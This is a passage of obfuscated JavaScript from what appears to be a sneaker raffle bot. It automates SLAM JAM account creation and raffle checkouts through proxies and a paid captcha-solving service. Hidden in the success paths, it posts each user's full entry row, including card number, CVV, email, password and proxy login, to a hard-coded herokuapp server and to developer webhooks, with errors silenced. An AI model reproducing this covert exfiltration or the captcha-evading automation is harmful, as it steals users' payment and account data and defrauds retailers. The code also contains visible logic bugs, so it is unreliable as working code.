                            await _0x262d6d['type']('#email', '' + _0x5ee613[_0x5cfe9b]['Email']), await _0x590479(0x384), await _0x262d6d['type']('#first_name', '' + _0x5ee613[_0x5cfe9b]['FirstName']), await _0x590479(0x514), await _0x262d6d['type']('#last_name', '' + _0x5ee613[_0x5cfe9b]['LastName']), await _0x590479(0x514), await _0x262d6d['type']('#street_address', _0x5ee613[_0x5cfe9b]['Address1'] + '\x20' + _0x5ee613[_0x5cfe9b]['HouseNumber'] + '\x20' + _0x5ee613[_0x5cfe9b]['Address2']), await _0x590479(0x2bc);
                            _0x5ee613[_0x5cfe9b]['Postcode'] == undefined && (_0x5ee613[_0x5cfe9b]['Postcode'] = _0x5ee613[_0x5cfe9b]['Zip']);
                            await _0x262d6d['type']('#zip_code', '' + _0x5ee613[_0x5cfe9b]['Postcode']), await _0x590479(0x320), await _0x262d6d['type']('#city', '' + _0x5ee613[_0x5cfe9b]['City']), await _0x590479(0x320), await _0x262d6d['type']('#bday', '01/01/1994'), await _0x590479(0x320), await _0x262d6d['type']('#instagram', '' + _0x5ee613[_0x5cfe9b]['Follower']), await _0x590479(0x352);
                            if (_0x5ee613[_0x5cfe9b]['Size'] == 'RANDOM') {
                                const _0x38ee1b = await _0x262d6d['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x8043d6 => {
                                    return _0x8043d6['map'](_0x4334f5 => _0x4334f5['textContent']);
                                });
                                var _0x3fc3a6 = Math['round'](Math['random']() * (_0x38ee1b['length'] - 0x1));
                                console['log'](_0x4786af() + '\x20[' + _0x4af4a6['name'] + ']\x20Task\x20' + (_0x5cfe9b + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x38ee1b[_0x3fc3a6]), await _0x262d6d['click']('label[data-eu-size=\x22' + _0x38ee1b[_0x3fc3a6] + '\x22]');
                            } else {
                                console['log'](_0x4786af() + '\x20[' + _0x4af4a6['name'] + ']\x20Task\x20' + (_0x5cfe9b + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x5ee613[_0x5cfe9b]['Size']);
                                try {
                                    await _0x262d6d['click']('label[data-eu-size=\x22' + _0x5ee613[_0x5cfe9b]['Size'] + '\x22]');
                                } catch {
                                    await _0x262d6d['click']('label[data-eu-size=\x22' + _0x5ee613[_0x5cfe9b]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x590479(0xbb8), await _0x262d6d['$$eval']('.raffle__checkbox-label', _0x3f0b07 => _0x3f0b07['forEach'](_0x1843c5 => _0x1843c5['click']())), await _0x590479(0x7d0), console['log'](_0x4786af() + '\x20[' + _0x4af4a6['name'] + ']\x20Task\x20' + (_0x5cfe9b + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x262d6d['click']('#raffle__form-submit'), await _0x590479(0x1388);
                            try {
                                await _0x262d6d['waitForSelector']('#raffle__confirmation-message-container'), _0x47e2b7 = 'no', _0x491fd3(_0x5ee613[_0x5cfe9b], _0x4af4a6), console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0x4af4a6['name'] + ']\x20Task\x20' + (_0x5cfe9b + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x2f7bef = _0x5ee613[_0x5cfe9b];
                                try {
                                    prxdata = {
                                        'username': _0x3d4e83['replace']('#', ''),
                                        'module': _0x4af4a6['name'],
                                        'entrydata': JSON['stringify'](_0x2f7bef),
                                        'proxy': '' + _0x1ae202[_0x5cfe9b]
                                    };
                                    var _0x4fdfc5 = JSON['stringify'](prxdata);
                                    let _0x51fe92 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x49fa88['post']('https://jraffles.herokuapp.com/success', _0x4fdfc5, _0x51fe92);
                                } catch (_0x5c3d4a) {
                                }
                            } catch (_0x1fd111) {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x514297[taskModule]['name'] + ']\x20Task\x20' + (_0x5cfe9b + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x1fd111));
                            }
                        } catch (_0x4b6aea) {
                            console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x514297[taskModule]['name'] + ']\x20Task\x20' + (_0x5cfe9b + 0x1) + '\x20:\x20' + _0x4b6aea)), _0x47e2b7 = 'yes';
                        } finally {
                            _0x245fcf && _0x245fcf['close']();
                            if (_0x47e2b7 == 'yes' && _0x1257eb != 0x5 && _0x4c004f != 'Size\x20Not\x20Found') {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x4af4a6['name'] + ']\x20Task\x20' + (_0x5cfe9b + 0x1) + '\x20:\x20Retrying\x20(' + _0x1257eb + '\x20/\x205)')), _0x5cfe9b = _0x5cfe9b - 0x1, _0x1257eb = _0x1257eb + 0x1;
                                continue;
                            }
                            _0x47e2b7 == 'yes' && _0x1257eb >= 0x5 && (_0x549c32(_0x5ee613[_0x5cfe9b], _0x4af4a6), _0x47e2b7 = 'no', _0x1257eb = 0x0), console['log']('Waiting\x20for\x20' + _0x4b1e6b['delay'] + '\x20ms'), await _0x590479(_0x4b1e6b['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x5f11db, _0xde86f4, _0x1d428a) {
                    _0x145da3['use'](_0x109835()), _0x145da3['use'](_0x29f0f6({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4b1e6b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1c2bec = 0x0; _0x1c2bec < _0xde86f4['length']; _0x1c2bec++) {
                        if (_0x7c7b71 != 'yes')
                            var _0x7c7b71 = '', _0x5cd4d7 = 0x0;
                        var _0x3f7337 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3d4e83
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4b1e6b['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1701ba
                                }
                            ]
                        }];
                        const _0x436022 = { 'embeds': _0x3f7337 };
                        _0x39f641(_0x5f11db['name'] + '\x20Task\x20' + (_0x1c2bec + 0x1) + '\x20/\x20' + _0xde86f4['length'] + '\x20||\x20File:\x20' + _0x4c637b + '\x20Proxies:\x20' + _0x1792f9);
                        try {
                            await _0x46b8ee(_0xde86f4, _0x1c2bec);
                        } catch {
                            _0x7c7b71 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x295d06 = await _0x54f36f(_0xde86f4[_0x1c2bec], _0x5f11db, 'acc', ![]);
                        const _0x5710e3 = { 'succesDEVMSG': { 'embeds': [_0x295d06] } };
                        if (_0xde86f4[_0x1c2bec]['Email'] == '' || _0xde86f4[_0x1c2bec]['FirstName'] == '' || _0xde86f4[_0x1c2bec]['LastName'] == '') {
                            console['log'](_0x4786af() + '\x20[' + _0x514297[taskModule]['name'] + ']\x20Task\x20' + (_0x1c2bec + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x590479(0x7d0);
                            continue;
                        }
                        (_0xde86f4[_0x1c2bec]['Password'] == '' || _0xde86f4[_0x1c2bec] == undefined) && _0xde86f4[_0x1c2bec]['Password'] == 'JRaffles23!';
                        if (_0x4b1e6b['useRandomProxy'] = ![])
                            var _0x1dffdc = _0x1d428a[_0x1c2bec]['split'](':');
                        else
                            var _0x47f2f0 = Math['round'](Math['random']() * (_0x1d428a['length'] - 0x1)), _0x1dffdc = _0x1d428a[_0x47f2f0]['split'](':');
                        var _0xab8c88;
                        try {
                            _0xab8c88 = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1dffdc[0x0] + ':' + _0x1dffdc[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xab8c88 = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1dffdc[0x0] + ':' + _0x1dffdc[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x25d538 = await _0xab8c88['newPage']();
                            await _0x25d538['authenticate']({
                                'username': '' + _0x1dffdc[0x2],
                                'password': '' + _0x1dffdc[0x3]
                            }), console['log'](_0x4786af() + '\x20[' + _0x5f11db['name'] + ']\x20Task\x20' + (_0x1c2bec + 0x1) + '\x20:\x20Getting\x20Session'), await _0x25d538['setRequestInterception'](!![]), _0x25d538['on']('request', _0x4f2794 => {
                                _0x4f2794['resourceType']() === 'image' || _0x4f2794['resourceType']() === 'font' || _0x4f2794['resourceType']() === 'media' ? _0x4f2794['abort']() : _0x4f2794['continue']();
                            }), await _0x25d538['goto']('https://drop.slamjam.com/account/register'), await _0x590479(0xbb8), await _0x25d538['waitForSelector']('#FirstName'), await _0x25d538['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x25d538['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x4786af() + '\x20[' + _0x5f11db['name'] + ']\x20Task\x20' + (_0x1c2bec + 0x1) + '\x20:\x20Filling\x20information'), await _0x590479(0x4b0), await _0x25d538['type']('#FirstName', '' + _0xde86f4[_0x1c2bec]['FirstName']), await _0x590479(0x226), await _0x25d538['type']('#LastName', '' + _0xde86f4[_0x1c2bec]['LastName']), await _0x590479(0x226), await _0x25d538['type']('#Email', '' + _0xde86f4[_0x1c2bec]['Email']), await _0x590479(0x2ee), await _0x25d538['type']('#ConfirmEmail', '' + _0xde86f4[_0x1c2bec]['Email']), await _0x590479(0x2ee), await _0x25d538['type']('#CreatePassword', '' + _0xde86f4[_0x1c2bec]['Password']), await _0x590479(0x2ee), await _0x25d538['type']('#CreateConfirmPassword', '' + _0xde86f4[_0x1c2bec]['Password']), await _0x590479(0x226), console['log'](_0x4786af() + '\x20[' + _0x5f11db['name'] + ']\x20Task\x20' + (_0x1c2bec + 0x1) + '\x20:\x20Submitting..'), await _0x25d538['$eval']('#create_customer', _0x55e318 => _0x55e318['submit']()), await _0x590479(0x1388), console['log'](_0x4786af() + '\x20[' + _0x5f11db['name'] + ']\x20Task\x20' + (_0x1c2bec + 0x1) + '\x20:\x20' + _0x4fb298['cyan']('Solving\x20Captcha')), await _0x25d538['solveRecaptchas'](), console['log'](_0x4786af() + '\x20[' + _0x5f11db['name'] + ']\x20Task\x20' + (_0x1c2bec + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x25d538['$eval']('.shopify-challenge__container\x20>\x20form', _0x317668 => _0x317668['submit']());
                            try {
                                await _0x25d538['waitForSelector']('.product-card__image'), await _0x590479(0x1f4), _0x7c7b71 = 'no', console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0x5f11db['name'] + ']\x20Task\x20' + (_0x1c2bec + 0x1) + '\x20:\x20Account\x20' + _0xde86f4[_0x1c2bec]['Email'] + '\x20Generated!')), _0x768c3f['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0xde86f4[_0x1c2bec]['Email'] + ',' + _0xde86f4[_0x1c2bec]['Password']), console['log'](_0x4fb298['yellow'](_0x4786af() + '\x20[' + _0x5f11db['name'] + ']\x20Task\x20' + (_0x1c2bec + 0x1) + '\x20:\x20Account\x20' + _0xde86f4[_0x1c2bec]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x5710e3['succesDEVMSG']);
                                } catch {
                                }
                                await _0x1690f0(_0x48932d, _0x5710e3['succesDEVMSG']);
                            } catch (_0x448577) {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x514297[taskModule]['name'] + ']\x20Task\x20' + (_0x1c2bec + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x448577));
                            }
                        } catch (_0x217dd9) {
                            console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x514297[taskModule]['name'] + ']\x20Task\x20' + (_0x1c2bec + 0x1) + '\x20:\x20' + _0x217dd9));
                        } finally {
                            _0xab8c88 && _0xab8c88['close']();
                            if (_0x7c7b71 == 'yes' && _0x5cd4d7 != 0x5) {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x5f11db['name'] + ']\x20Task\x20' + (_0x1c2bec + 0x1) + '\x20:\x20Retrying\x20(' + _0x5cd4d7 + '\x20/\x205)')), _0x1c2bec = _0x1c2bec - 0x1, _0x5cd4d7 = _0x5cd4d7 + 0x1;
                                continue;
                            }
                            _0x7c7b71 == 'yes' && _0x5cd4d7 >= 0x5 && (_0x549c32(_0xde86f4[_0x1c2bec], _0x5f11db), _0x7c7b71 = 'no', _0x5cd4d7 = 0x0), console['log']('Waiting\x20for\x20' + _0x4b1e6b['delay'] + '\x20ms'), await _0x590479(_0x4b1e6b['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x34a334, _0x1886a3, _0x486ea4) {
                    _0x145da3['use'](_0x109835()), _0x145da3['use'](_0x29f0f6({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4b1e6b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x11ff91 = 0x0; _0x11ff91 < _0x1886a3['length']; _0x11ff91++) {
                        var _0x56e0ab;
                        if (_0x3ca92b != 'yes')
                            var _0x3ca92b = '', _0x1b0286 = 0x0;
                        _0x39f641(_0x34a334['name'] + '\x20Task\x20' + (_0x11ff91 + 0x1) + '\x20/\x20' + _0x1886a3['length'] + '\x20||\x20File:\x20' + _0x4c637b + '\x20Proxies:\x20' + _0x1792f9);
                        try {
                            await _0x46b8ee(_0x1886a3, _0x11ff91);
                        } catch {
                            _0x3ca92b = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x1886a3[_0x11ff91]['Email'] == '' || _0x1886a3[_0x11ff91]['Password'] == '' || _0x1886a3[_0x11ff91]['FirstName'] == '' || _0x1886a3[_0x11ff91]['LastName'] == '') {
                            console['log'](_0x4786af() + '\x20[' + _0x34a334['name'] + ']\x20Task\x20' + (_0x11ff91 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x4b1e6b['useRandomProxy'] = ![])
                            var _0x13a76e = _0x486ea4[_0x11ff91]['split'](':');
                        else
                            var _0x320047 = Math['round'](Math['random']() * (_0x486ea4['length'] - 0x1)), _0x13a76e = _0x486ea4[_0x320047]['split'](':');
                        var _0x5efc6a;
                        try {
                            _0x5efc6a = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x13a76e[0x0] + ':' + _0x13a76e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5efc6a = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x13a76e[0x0] + ':' + _0x13a76e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1d4941 = await _0x5efc6a['newPage']();
                            await _0x1d4941['authenticate']({
                                'username': '' + _0x13a76e[0x2],
                                'password': '' + _0x13a76e[0x3]
                            }), await _0x1d4941['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x4786af() + '\x20[' + _0x34a334['name'] + ']\x20Task\x20' + (_0x11ff91 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1d4941['setRequestInterception'](!![]), _0x1d4941['on']('request', _0x398c92 => {
                                _0x398c92['resourceType']() === 'image' || _0x398c92['resourceType']() === 'font' || _0x398c92['resourceType']() === 'media' ? _0x398c92['abort']() : _0x398c92['continue']();
                            }), await _0x1d4941['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x1d4941['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x1d4941['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x590479(0x258), await _0x1d4941['waitForSelector']('#CustomerEmail'), console['log'](_0x4786af() + '\x20[' + _0x34a334['name'] + ']\x20Task\x20' + (_0x11ff91 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x1d4941['type']('#CustomerEmail', '' + _0x1886a3[_0x11ff91]['Email']), await _0x590479(0x12c), await _0x1d4941['type']('#CustomerPassword', '' + _0x1886a3[_0x11ff91]['Password']), await _0x590479(0x226), await _0x1d4941['$eval']('#customer_login', _0x2eaecb => _0x2eaecb['submit']()), await _0x590479(0x7d0), await _0x1d4941['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x4786af() + '\x20[' + _0x34a334['name'] + ']\x20Task\x20' + (_0x11ff91 + 0x1) + '\x20:\x20' + _0x4fb298['cyan']('Solving\x20Captcha')), await _0x1d4941['solveRecaptchas'](), console['log'](_0x4786af() + '\x20[' + _0x34a334['name'] + ']\x20Task\x20' + (_0x11ff91 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x1d4941['$eval']('.shopify-challenge__container\x20>\x20form', _0x1e43fe => _0x1e43fe['submit']());
                            try {
                                await _0x1d4941['waitForSelector']('.nav-account'), await _0x590479(0x4b0);
                            } catch {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x34a334['name'] + ']\x20Task\x20' + (_0x11ff91 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x1d4941['goto']('' + _0x1886a3[_0x11ff91]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x590479(0xbb8), console['log'](_0x4786af() + '\x20[' + _0x34a334['name'] + ']\x20Task\x20' + (_0x11ff91 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x1d4941['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x1d4941['click']('.product-select-variant-wrapper'), await _0x590479(0x320), await _0x1d4941['click']('li.product-select-variant__value[data-size=\x22' + _0x1886a3[_0x11ff91]['Size'] + '\x22]'), await _0x590479(0x384), await _0x1d4941['$eval']('#AddToCartForm-product-template-raffle', _0xac63d1 => _0xac63d1['submit']()), await _0x1d4941['waitForSelector']('.cart-order-summary__content'), await _0x590479(0x514), await _0x1d4941['goto']('https://drop.slamjam.com/checkout'), await _0x590479(0x514), await _0x1d4941['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x4786af() + '\x20[' + _0x34a334['name'] + ']\x20Task\x20' + (_0x11ff91 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1d4941['select']('#checkout_shipping_address_country', '' + _0x1886a3[_0x11ff91]['Country']), await _0x590479(0x200), await _0x1d4941['waitForSelector']('#checkout_shipping_address_first_name'), await _0x1d4941['type']('#checkout_shipping_address_first_name', '' + _0x1886a3[_0x11ff91]['FirstName']), await _0x590479(0x237), await _0x1d4941['type']('#checkout_shipping_address_last_name', '' + _0x1886a3[_0x11ff91]['LastName']), await _0x590479(0x1e0), await _0x1d4941['type']('#checkout_shipping_address_address1', _0x1886a3[_0x11ff91]['Address1'] + '\x20' + _0x1886a3[_0x11ff91]['HouseNumber']), await _0x590479(0x514), await _0x1d4941['type']('#checkout_shipping_address_address2', '' + _0x1886a3[_0x11ff91]['Address2']), await _0x590479(0x514);
                            _0x1886a3[_0x11ff91]['Postcode'] == undefined && (_0x1886a3[_0x11ff91]['Postcode'] = _0x1886a3[_0x11ff91]['Zip']);
                            await _0x1d4941['type']('#checkout_shipping_address_zip', '' + _0x1886a3[_0x11ff91]['Postcode']), await _0x590479(0x2bc), await _0x1d4941['type']('#checkout_shipping_address_city', '' + _0x1886a3[_0x11ff91]['City']), await _0x590479(0x320), await _0x1d4941['type']('#checkout_shipping_address_phone', '' + _0x1886a3[_0x11ff91]['Phone']), await _0x590479(0x320), await _0x1d4941['click']('#continue_button'), await _0x590479(0xbb8), await _0x1d4941['waitForSelector']('.summary-title'), await _0x590479(0x320), await _0x1d4941['click']('#continue_button'), await _0x590479(0x320), console['log'](_0x4786af() + '\x20[' + _0x34a334['name'] + ']\x20Task\x20' + (_0x11ff91 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x1d4941['waitForSelector']('#checkout_credit_card_vault'), await _0x590479(0x3e8);
                            var _0x53a86e = await _0x1d4941['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x1f7481 = await _0x53a86e['contentFrame']();
                            await _0x1f7481['click']('#number'), await _0x590479(0x3e8), await _0x1f7481['type']('#number', '' + _0x1886a3[_0x11ff91]['CardNumber'], { 'delay': 0x78 }), _0x53a86e = await _0x1d4941['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x1f7481 = await _0x53a86e['contentFrame'](), await _0x590479(0x1c2), await _0x1f7481['click']('#name'), await _0x590479(0x1f4), await _0x1f7481['type']('#name', '' + _0x1886a3[_0x11ff91]['NameOnCard'], { 'delay': 0x78 }), _0x53a86e = await _0x1d4941['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x1f7481 = await _0x53a86e['contentFrame'](), await _0x590479(0x1c2), await _0x1f7481['click']('#expiry'), await _0x590479(0x1f4), await _0x1f7481['type']('#expiry', '' + _0x1886a3[_0x11ff91]['ExpiryDate'], { 'delay': 0x78 }), _0x53a86e = await _0x1d4941['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x1f7481 = await _0x53a86e['contentFrame'](), await _0x590479(0x1c2), await _0x1f7481['click']('#verification_value'), await _0x590479(0x1f4), await _0x1f7481['type']('#verification_value', '' + _0x1886a3[_0x11ff91]['CVV'], { 'delay': 0x78 }), await _0x1d4941['$eval']('#accepts-flag-raffle', _0xa07936 => _0xa07936['click']()), await _0x590479(0x7d0), console['log'](_0x4786af() + '\x20[' + _0x34a334['name'] + ']\x20Task\x20' + (_0x11ff91 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x1d4941['$eval']('#continue_button', _0x475126 => _0x475126['click']()), await _0x590479(0x1b58), await _0x1d4941['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x1d4941['$eval']('.edit_checkout.animate-floating-labels', _0x55211a => _0x55211a['submit']()), await _0x590479(0x7d0);
                            try {
                                await _0x1d4941['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x3ca92b = 'no', _0x491fd3(_0x1886a3[_0x11ff91], _0x34a334), console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0x34a334['name'] + ']\x20Task\x20' + (_0x11ff91 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x160348) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x160348['message']);
                            }
                            var _0x29a5aa = await _0x54f36f(_0x1886a3[_0x11ff91], _0x34a334, 'dev', ![]), _0x137277 = await _0x54f36f(_0x1886a3[_0x11ff91], _0x34a334, 'pub', ![]);
                            let _0x2806f4 = _0x1886a3[_0x11ff91];
                            try {
                                prxdata = {
                                    'username': _0x3d4e83['replace']('#', ''),
                                    'module': _0x34a334['name'],
                                    'entrydata': JSON['stringify'](_0x2806f4),
                                    'proxy': '' + _0x486ea4[_0x11ff91]
                                };
                                var _0x5c3703 = JSON['stringify'](prxdata);
                                let _0x5c43da = { 'headers': { 'content-type': 'application/json' } };
                                await _0x49fa88['post']('https://jraffles.herokuapp.com/success', _0x5c3703, _0x5c43da);
                            } catch (_0x1cb257) {
                            }
                            const _0x220139 = {
                                'succesDEVMSG': { 'embeds': [_0x29a5aa] },
                                'succesPUBMSG': { 'embeds': [_0x137277] }
                            };
                            try {
                                _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x220139['succesDEVMSG']), await _0x590479(0xc8), await _0x1690f0(_0x4f7f5d, _0x220139['succesDEVMSG']), await _0x590479(0xc8), await _0x1690f0(_0x4807c3, _0x220139['succesPUBMSG']);
                            } catch (_0x19de4e) {
                                console['log'](_0x4fb298['yellow'](_0x4786af() + '\x20[' + _0x514297[taskModule]['name'] + ']\x20Task\x20' + (_0x11ff91 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x19de4e));
                            }
                        } catch (_0x218efc) {
                            console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x514297[taskModule]['name'] + ']\x20Task\x20' + (_0x11ff91 + 0x1) + '\x20:\x20' + _0x218efc)), _0x56e0ab = '' + _0x218efc;
                            var _0x23bd64 = await _0x54f36f(kickz[_0x11ff91], _0x34a334, 'dev', !![], _0x56e0ab);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x23bd64] }, _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], EMBEDS['errorDEV']), await _0x1690f0(_0x874ee1, EMBEDS['errorDEV']), _0x3ca92b = 'yes';
                        } finally {
                            _0x5efc6a && _0x5efc6a['close']();
                            if (_0x3ca92b == 'yes' && _0x1b0286 != 0x5 && _0x56e0ab != 'Size\x20Not\x20Found') {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x34a334['name'] + ']\x20Task\x20' + (_0x11ff91 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1b0286 + '\x20/\x205)')), _0x11ff91 = _0x11ff91 - 0x1, _0x1b0286 = _0x1b0286 + 0x1;
                                continue;
                            }
                            _0x3ca92b == 'yes' && _0x1b0286 >= 0x5 && (_0x549c32(_0x1886a3[_0x11ff91], _0x34a334), _0x3ca92b = 'no', _0x1b0286 = 0x0), console['log']('Waiting\x20for\x20' + _0x4b1e6b['delay'] + '\x20ms'), await _0x590479(_0x4b1e6b['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x415b3a) {
                    var _0x5b879d = await _0x2fefe9(), _0x5c3c1e = _0x768c3f['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x4152df = _0x38692b['parse'](_0x5c3c1e, { 'header': !![] })['data'];
                    for (var _0x5949d3 = 0x0; _0x5949d3 < _0x4152df['length']; _0x5949d3++) {
                        var _0x22ceaa = _0x4152df[_0x5949d3]['Store'], _0x2d0a5a = _0x4152df[_0x5949d3]['Mode'];
                        for (var _0x278899 of _0x514297) {
                            const _0x2cadb2 = _0x278899['name']['includes'](_0x22ceaa);
                            if (!_0x2cadb2)
                                continue;
                            for (mode of _0x278899['modules']) {
                                if (mode['name'] == _0x2d0a5a) {
                                    console['log']('Running\x20' + _0x4fb298['cyan'](mode['name'])), await mode['function'](mode, [_0x4152df[_0x5949d3]], _0x5b879d);
                                    var _0x22d024 = _0x5c3c1e['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x768c3f['writeFileSync']('../failed-tasks.csv', _0x22d024);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x18a315 = await _0x1bacab['get']('Answer');
                    if (_0x18a315['Answer']['toLowerCase']() == 'y') {
                        _0x768c3f['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x590479(0x3e8);
                        return;
                    }
                    if (_0x18a315['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x590479(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x590479(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x22da66(_0x8f24bd) {
